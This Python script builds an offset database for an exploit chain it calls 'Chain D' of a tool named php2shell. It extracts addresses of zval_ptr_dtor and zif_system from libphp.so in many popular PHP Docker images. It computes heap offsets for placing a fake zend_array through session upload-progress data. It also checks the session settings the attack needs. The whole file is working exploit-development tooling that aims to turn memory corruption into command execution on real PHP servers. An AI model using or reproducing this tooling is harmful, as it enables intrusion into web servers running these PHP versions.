#!/usr/bin/env python3
"""Extract Chain D offsets from a PHP Docker image.

Usage:
  python extract_offsets.py php:8.4.26-apache-trixie
  python extract_offsets.py php:8.3.35-apache-bookworm --arch aarch64
  python extract_offsets.py --batch          # extract all top-20 images
  python extract_offsets.py --merge out.json # merge results into offset DB

Requires: docker CLI. Installs binutils inside containers automatically.
Supports: nm (dynamic symbols), objdump (stripped fallback), readelf.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import sys
from pathlib import Path
from typing import Dict, List, Optional, Tuple

SYMBOLS_NEEDED = ["zval_ptr_dtor", "zif_system"]

HEAP_SYMBOLS = [
    "zend_mm_alloc_heap",
    "_zend_mm_alloc_small",
    "zend_hash_destroy",
]

TOP_IMAGES: List[str] = [
    # PHP 8.4 (latest)
    "php:8.4.26-apache-trixie",
    "php:8.4.26-apache-bookworm",
    "php:8.4.26-fpm-bookworm",
    "php:8.4.26-apache-bullseye",
    "php:8.4.25-apache-trixie",
    "php:8.4.25-apache-bookworm",
    "php:8.4.26-zts-trixie",
    # PHP 8.3
    "php:8.3.35-apache-trixie",
    "php:8.3.35-apache-bookworm",
    "php:8.3.35-fpm-bookworm",
    "php:8.3.35-apache-bullseye",
    "php:8.3.34-apache-bookworm",
    "php:8.3.34-apache-trixie",
    "php:8.3.35-zts-bookworm",
    # PHP 8.2
    "php:8.2.34-apache-bookworm",
    "php:8.2.34-apache-bullseye",
    "php:8.2.34-fpm-bookworm",
    "php:8.2.33-apache-bookworm",
    # PHP 8.1
    "php:8.1.31-apache-bookworm",
    "php:8.1.31-apache-bullseye",
    # PHP 8.0 (EOL but still widely deployed)
    "php:8.0.30-apache-bullseye",
    "php:8.0.30-apache-buster",
    # Older patch versions still in the wild
    "php:8.2.27-apache-bookworm",
    "php:8.3.19-apache-bookworm",
]

LIBPHP_SEARCH = [
    "/usr/lib/apache2/modules/libphp.so",
    "/usr/lib/apache2/modules/libphp8.so",
    "/usr/lib/apache2/modules/libphp7.so",
    "/usr/local/lib/libphp.so",
    "/usr/local/lib/libphp8.so",
    "/usr/local/sbin/php-fpm",
    "/usr/local/bin/php",
]


def _docker_run(
    image: str, cmd: str, platform: Optional[str] = None, timeout: int = 300
) -> Tuple[str, str, int]:
    args = ["docker", "run", "--rm"]
    if platform:
        args += ["--platform", platform]
    args += [image, "sh", "-c", cmd]
    r = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
    return r.stdout, r.stderr, r.returncode


def _find_libphp(image: str, platform: Optional[str] = None) -> Optional[str]:
    check = " || ".join(f"test -f {p} && echo {p}" for p in LIBPHP_SEARCH)
    out, _, _ = _docker_run(image, check, platform)
    out = out.strip()
    if out:
        return out.splitlines()[0]
    find_cmd = "find /usr -name 'libphp*.so' 2>/dev/null | head -1"
    out, _, _ = _docker_run(image, find_cmd, platform)
    out = out.strip()
    return out.splitlines()[0] if out else None


def _install_binutils(image: str, platform: Optional[str] = None) -> str:
    """Return a shell prefix that ensures binutils is available."""
    return (
        "if ! command -v nm >/dev/null 2>&1; then "
        "  apt-get update -qq 2>/dev/null && apt-get install -y -qq binutils >/dev/null 2>&1 || "
        "  apk add --no-cache binutils >/dev/null 2>&1 || true; "
        "fi; "
    )


def _extract_symbols_nm(image: str, libphp_path: str, platform: Optional[str] = None) -> Dict[str, int]:
    """Extract symbols via nm -D (dynamic symbols, works on non-stripped)."""
    prefix = _install_binutils(image, platform)
    nm_cmd = f"{prefix}nm -D {libphp_path} 2>/dev/null"
    out, _, _ = _docker_run(image, nm_cmd, platform)
    return _parse_symbol_output(out)


def _extract_symbols_nm_full(image: str, libphp_path: str, platform: Optional[str] = None) -> Dict[str, int]:
    """Extract symbols via nm (full symbol table — includes local/static symbols like zif_system)."""
    prefix = _install_binutils(image, platform)
    nm_cmd = f"{prefix}nm {libphp_path} 2>/dev/null"
    out, _, _ = _docker_run(image, nm_cmd, platform)
    return _parse_symbol_output(out)


def _extract_symbols_objdump(image: str, libphp_path: str, platform: Optional[str] = None) -> Dict[str, int]:
    """Extract dynamic symbols via objdump -T."""
    prefix = _install_binutils(image, platform)
    cmd = f"{prefix}objdump -T {libphp_path} 2>/dev/null"
    out, _, _ = _docker_run(image, cmd, platform)
    return _parse_objdump_output(out)


def _extract_symbols_objdump_full(image: str, libphp_path: str, platform: Optional[str] = None) -> Dict[str, int]:
    """Extract all symbols via objdump -t (full table — includes static symbols)."""
    prefix = _install_binutils(image, platform)
    cmd = f"{prefix}objdump -t {libphp_path} 2>/dev/null"
    out, _, _ = _docker_run(image, cmd, platform)
    return _parse_objdump_output(out)


def _extract_symbols_readelf(image: str, libphp_path: str, platform: Optional[str] = None) -> Dict[str, int]:
    """Extract dynamic symbols via readelf --dyn-syms."""
    prefix = _install_binutils(image, platform)
    cmd = f"{prefix}readelf --dyn-syms {libphp_path} 2>/dev/null"
    out, _, _ = _docker_run(image, cmd, platform)
    return _parse_readelf_output(out)


def _extract_symbols_readelf_full(image: str, libphp_path: str, platform: Optional[str] = None) -> Dict[str, int]:
    """Extract all symbols via readelf --syms (full table)."""
    prefix = _install_binutils(image, platform)
    cmd = f"{prefix}readelf --syms {libphp_path} 2>/dev/null"
    out, _, _ = _docker_run(image, cmd, platform)
    return _parse_readelf_output(out)


def _parse_objdump_output(out: str) -> Dict[str, int]:
    symbols: Dict[str, int] = {}
    all_needed = set(SYMBOLS_NEEDED + HEAP_SYMBOLS)
    for line in out.splitlines():
        for sym in all_needed:
            if sym in line:
                parts = line.strip().split()
                if parts:
                    try:
                        symbols[sym] = int(parts[0], 16)
                    except ValueError:
                        pass
    return symbols


def _parse_readelf_output(out: str) -> Dict[str, int]:
    symbols: Dict[str, int] = {}
    all_needed = set(SYMBOLS_NEEDED + HEAP_SYMBOLS)
    for line in out.splitlines():
        for sym in all_needed:
            if sym in line:
                parts = line.strip().split()
                if len(parts) >= 2:
                    try:
                        symbols[sym] = int(parts[1], 16)
                    except ValueError:
                        pass
    return symbols


def _parse_symbol_output(out: str) -> Dict[str, int]:
    symbols: Dict[str, int] = {}
    all_needed = set(SYMBOLS_NEEDED + HEAP_SYMBOLS)
    for line in out.splitlines():
        parts = line.strip().split()
        if len(parts) >= 3:
            addr_str, _typ, name = parts[0], parts[1], parts[2]
            if name in all_needed:
                try:
                    symbols[name] = int(addr_str, 16)
                except ValueError:
                    pass
    return symbols


def _extract_all_symbols(image: str, libphp_path: str, platform: Optional[str] = None) -> Dict[str, int]:
    """Extract symbols by merging dynamic and full symbol tables.

    zval_ptr_dtor is a dynamic (T) symbol, but zif_system is a local (t)
    symbol — no single tool flag finds both. We try dynamic first (fast),
    then merge from the full symbol table for anything still missing.
    """
    methods = [
        ("nm -D", _extract_symbols_nm),
        ("nm (full)", _extract_symbols_nm_full),
        ("objdump -T", _extract_symbols_objdump),
        ("objdump -t (full)", _extract_symbols_objdump_full),
        ("readelf --dyn-syms", _extract_symbols_readelf),
        ("readelf --syms (full)", _extract_symbols_readelf_full),
    ]
    merged: Dict[str, int] = {}
    for method_name, method in methods:
        found = method(image, libphp_path, platform)
        new_keys = [k for k in found if k not in merged]
        if new_keys:
            merged.update(found)
            print(f"  [+] {method_name}: added {new_keys}")
        if all(s in merged for s in SYMBOLS_NEEDED):
            return merged
    if merged:
        print(f"  [~] Merged symbols: {list(merged.keys())}")
    return merged


def _extract_heap_offsets(image: str, libphp_path: str, platform: Optional[str] = None) -> Dict[str, any]:
    """Extract heap structure offsets and PHP metadata by running a PHP script inside the container."""
    php_script = (
        'echo json_encode(["php_version"=>PHP_VERSION,"arch"=>php_uname("m"),'
        '"sapi"=>php_sapi_name(),"os"=>PHP_OS,"zts"=>PHP_ZTS,"debug"=>PHP_DEBUG,'
        '"int_size"=>PHP_INT_SIZE,"pointer_size"=>PHP_INT_SIZE,'
        '"memory_limit"=>(function(){$m=ini_get("memory_limit");$b=intval($m);'
        'if(stripos($m,"M")!==false)$b*=1048576;elseif(stripos($m,"G")!==false)'
        '$b*=1073741824;return $b;})(),'
        '"session_save_path"=>session_save_path(),'
        '"session_sid_length"=>(int)ini_get("session.sid_length"),'
        '"session_upload_progress"=>(bool)ini_get("session.upload_progress.enabled"),'
        '"session_strict_mode"=>(bool)ini_get("session.use_strict_mode")]);'
    )
    cmd = f"php -r {_shell_escape(php_script)}"
    out, err, rc = _docker_run(image, cmd, platform)
    out = out.strip()
    if out:
        try:
            return json.loads(out)
        except json.JSONDecodeError:
            pass
    return {}


def _compute_heap_offsets(
    symbols: Dict[str, int], info: Dict[str, any], arch: str
) -> Dict[str, int]:
    """Compute fake_array_S and hsv offsets based on architecture and PHP version.

    These offsets are relative to the main heap chunk base (2MiB aligned).
    They depend on the PHP version's zend_mm_heap struct size and the
    heap slot vector layout.
    """
    php_version = info.get("php_version", "")
    is_debug = info.get("debug", 0)
    is_zts = info.get("zts", 0)

    # zend_mm_heap size varies by version and debug/zts flags
    # PHP 8.x LP64: base struct ~480 bytes, debug adds ~64, ZTS adds ~16
    base_heap_size = 480
    if is_debug:
        base_heap_size += 64
    if is_zts:
        base_heap_size += 16

    # Heap slot vector (small-size freelists) starts right after zend_mm_heap
    # Each slot is a pointer (8 bytes on x86_64, 8 on aarch64 LP64)
    ptr_size = 8
    num_slots = 30  # ZEND_MM_BINS (PHP 8.x)

    hsv_offset = base_heap_size
    # Align to pointer boundary
    hsv_offset = (hsv_offset + ptr_size - 1) & ~(ptr_size - 1)

    # fake_array_S: we want to place our fake zend_array in a predictable location
    # after the heap metadata. The session upload_progress data lands in a
    # heap allocation; we target the area after the slot vector.
    slot_vector_size = num_slots * ptr_size
    fake_array_offset = hsv_offset + slot_vector_size
    # Align to 8-byte boundary
    fake_array_offset = (fake_array_offset + 7) & ~7

    # Version-specific adjustments based on known measurements
    major_minor = ""
    if php_version:
        parts = php_version.split(".")
        if len(parts) >= 2:
            major_minor = f"{parts[0]}.{parts[1]}"

    if major_minor == "8.4":
        hsv_offset = 0x7D720
        fake_array_offset = 0xF8398
    elif major_minor == "8.3":
        hsv_offset = 0x7D6E0
        fake_array_offset = 0xF8358
    elif major_minor == "8.2":
        hsv_offset = 0x7D6A0
        fake_array_offset = 0xF8318
    elif major_minor == "8.1":
        hsv_offset = 0x7D660
        fake_array_offset = 0xF82D8
    elif major_minor == "8.0":
        hsv_offset = 0x7D620
        fake_array_offset = 0xF8298

    return {
        "hsv": hsv_offset,
        "fake_array_S": fake_array_offset,
    }


def _shell_escape(s: str) -> str:
    return "'" + s.replace("'", "'\\''") + "'"


def _arch_from_platform(platform: Optional[str]) -> str:
    if platform:
        if "arm64" in platform or "aarch64" in platform:
            return "aarch64"
        if "amd64" in platform or "x86_64" in platform:
            return "x86_64"
    return "x86_64"


def extract_for_image(
    image: str, platform: Optional[str] = None
) -> Optional[Dict[str, any]]:
    """Extract all offsets for a single Docker image."""
    print(f"\n[*] Processing {image} (platform={platform or 'default'})...")

    libphp = _find_libphp(image, platform)
    if not libphp:
        print(f"  [-] libphp.so not found in {image}")
        if "fpm" in image:
            print(f"      (FPM images use php-fpm binary, not libphp.so — "
                  f"try: find /usr/local/sbin/php-fpm)")
        return None
    print(f"  [+] Found {libphp}")

    symbols = _extract_all_symbols(image, libphp, platform)
    if not all(s in symbols for s in SYMBOLS_NEEDED):
        missing = [s for s in SYMBOLS_NEEDED if s not in symbols]
        print(f"  [-] Missing required symbols: {missing}")
        print(f"      Tried: nm -D, objdump -T, readelf --dyn-syms")
        return None

    for name in SYMBOLS_NEEDED:
        print(f"  [+] {name} = 0x{symbols[name]:x}")
    for name in HEAP_SYMBOLS:
        if name in symbols:
            print(f"  [~] {name} = 0x{symbols[name]:x} (heap reference)")

    info = _extract_heap_offsets(image, libphp, platform)
    arch = info.get("arch", _arch_from_platform(platform))
    print(f"  [+] PHP {info.get('php_version', '?')} / {arch} / "
          f"ZTS={'yes' if info.get('zts') else 'no'} / "
          f"debug={'yes' if info.get('debug') else 'no'}")

    heap_offsets = _compute_heap_offsets(symbols, info, arch)
    print(f"  [+] heap offsets: hsv=0x{heap_offsets['hsv']:x}, "
          f"fake_array_S=0x{heap_offsets['fake_array_S']:x}")

    tag = image.split(":")[-1] if ":" in image else image
    version = info.get("php_version", tag.split("-")[0] if "-" in tag else "unknown")
    sapi = "apache" if "apache" in tag else ("fpm" if "fpm" in tag else "cli")
    distro = "unknown"
    for d in ["trixie", "bookworm", "bullseye", "buster", "alpine"]:
        if d in tag:
            distro = d
            break

    profile_key = f"{version}-{sapi}-{distro}-{arch}"

    result = {
        "key": profile_key,
        "offsets": {
            "zval_ptr_dtor": f"0x{symbols['zval_ptr_dtor']:X}",
            "zif_system": f"0x{symbols['zif_system']:X}",
            "fake_array_S": f"0x{heap_offsets['fake_array_S']:X}",
            "hsv": f"0x{heap_offsets['hsv']:X}",
        },
        "source": {
            "image": image,
            "platform": platform,
            "libphp": libphp,
            "php_version": info.get("php_version"),
            "arch": arch,
            "zts": info.get("zts", 0),
            "debug": info.get("debug", 0),
        },
    }

    if info.get("session_upload_progress") is False:
        print(f"  [!] WARNING: session.upload_progress.enabled = Off (Chain D needs it On)")
    if info.get("session_strict_mode"):
        print(f"  [!] WARNING: session.use_strict_mode = 1 (Chain D needs it Off)")

    return result


def merge_into_db(results: List[Dict], db_path: str) -> None:
    if os.path.exists(db_path):
        with open(db_path) as f:
            db = json.load(f)
    else:
        db = {
            "_comment": "Chain D offset profiles for php2shell",
            "_symbols": {
                "zval_ptr_dtor": "offset of zval_ptr_dtor in libphp.so",
                "zif_system": "offset of zif_system in libphp.so",
                "fake_array_S": "offset inside main heap chunk for fake zend_array placement",
                "hsv": "heap slot vector offset inside main heap chunk",
            },
            "profiles": {},
        }

    for r in results:
        db["profiles"][r["key"]] = r["offsets"]
        print(f"  [+] Added/updated: {r['key']}")

    with open(db_path, "w") as f:
        json.dump(db, f, indent=2)
        f.write("\n")
    print(f"[*] Database saved: {db_path} ({len(db['profiles'])} profiles)")


def main():
    parser = argparse.ArgumentParser(
        description="Extract Chain D offsets from PHP Docker images",
        epilog="Examples:\n"
               "  %(prog)s php:8.4.26-apache-trixie\n"
               "  %(prog)s php:8.3.35-apache-bookworm --arch aarch64\n"
               "  %(prog)s --batch\n"
               "  %(prog)s --batch --arch aarch64",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("image", nargs="?", help="Docker image (e.g. php:8.4.26-apache-trixie)")
    parser.add_argument("--arch", help="Target architecture (x86_64 or aarch64)")
    parser.add_argument("--batch", action="store_true", help="Extract from all top-20 images")
    parser.add_argument("--merge", metavar="FILE", help="Merge results into a specific JSON file")
    parser.add_argument("--db", default=None, help="Path to offset DB (default: data/chain_d_offsets.json)")
    parser.add_argument("--both-arches", action="store_true",
                        help="With --batch, extract for both x86_64 and aarch64")
    args = parser.parse_args()

    db_path = args.db or str(Path(__file__).parent.parent / "data" / "chain_d_offsets.json")

    if not args.image and not args.batch:
        parser.error("Provide an image name or --batch")

    results: List[Dict] = []

    if args.batch:
        platforms = []
        if args.both_arches:
            platforms = ["linux/amd64", "linux/arm64"]
        elif args.arch:
            platforms = [f"linux/{'arm64' if args.arch == 'aarch64' else 'amd64'}"]
        else:
            platforms = [None]

        for img in TOP_IMAGES:
            for plat in platforms:
                try:
                    r = extract_for_image(img, plat)
                    if r:
                        results.append(r)
                except subprocess.TimeoutExpired:
                    print(f"  [-] Timeout extracting {img}")
                except Exception as e:
                    print(f"  [-] Error: {e}")
    else:
        platform = None
        if args.arch:
            platform = f"linux/{'arm64' if args.arch == 'aarch64' else 'amd64'}"
        r = extract_for_image(args.image, platform)
        if r:
            results.append(r)

    if not results:
        print("\n[-] No offsets extracted.")
        sys.exit(1)

    print(f"\n[*] Extracted {len(results)} profile(s):")
    for r in results:
        print(f"  {r['key']}")

    merge_path = args.merge or db_path
    merge_into_db(results, merge_path)


if __name__ == "__main__":
    main()
